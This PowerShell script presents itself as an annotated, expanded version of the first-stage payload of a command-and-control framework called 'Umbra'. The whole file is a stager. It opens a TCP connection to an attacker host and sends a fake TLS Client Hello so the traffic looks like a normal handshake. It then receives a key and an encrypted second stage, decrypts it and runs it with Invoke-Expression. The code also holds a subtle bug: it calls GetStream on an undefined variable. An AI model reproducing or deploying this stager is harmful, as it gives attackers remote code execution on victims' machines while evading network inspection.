# This file is a broken up, verbose version of the payload used in the Umbra
# command and control framework. It is put here to server an example as what
# is possible in powershell, and if anything breaks in future use, the issues
# are more diagnosable.

# Decrypt function to decrypt the content that will be sent for the second
# stage in the payload execution. 

function Decrypt-Content ($RawContent, $EncryptionKey)
{
	$PlainText                          = [Byte[]] @()
	
	for ($Index = 0; $Index -lt $RawContent.Length; $Index++)
	{
		$PlainText                     += ($RawContent[$Index] - $EncryptionKey[$Index % 32] + 255) % 256
	}
	
	return $PlainText
}

# Decode the client hello from base64 to raw bytes, ready to send.

$Base64UniqueClientHello                = "FgMDAC0BAAApAwMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAvAQA="
$UniqueClientHello                      = [Convert]::FromBase64String($Base64UniqueClientHello)

# After connecting to the attacker, write over the specially formulated client hello
# to validate we will be ready for the second stage.

# There is a total of 64 bytes for the next steps in the TLS handshake, but we may
# not be ready for it. We scoop 1 byte 64 times for mitigation.

# Then we are given the key and ciphered payload to execute. Extract the key, decrypt
# the payload, and execute.

$Attacker                               = [Net.Sockets.TcpClient]::new("127.0.0.1", 443)
$AttackerStream                         = $Attack.GetStream()
$AttackerStream.Write($UniqueClientHello, 0, $UniqueClientHello.Length)

$Buffer                                 = [Byte[]]::new(65535)

for ($Index = 0; $Index -lt 64; $Index++)
{
	$BytesRead                          = $AttackerStream.Read($Buffer, 0, 1)
}

$BytesRead                              = $AttackerStream.Read($Buffer, 0, $Buffer.Length)
$RecordLength                           = (([Int] $Buffer[3]) -shl 8) -bor $Buffer[4]
$EncryptionKey                          = $Buffer[5..1028]
$CipheredContent                        = $Buffer[1029..(4 + $RecordLength)]
$PlainTextContent                       = Decrypt-Content $CipheredContent $EncryptionKey
$PlainTextString                        = [Text.Encoding]::UTF8.GetString($PlainTextContent)

Invoke-Expression $PlainTextString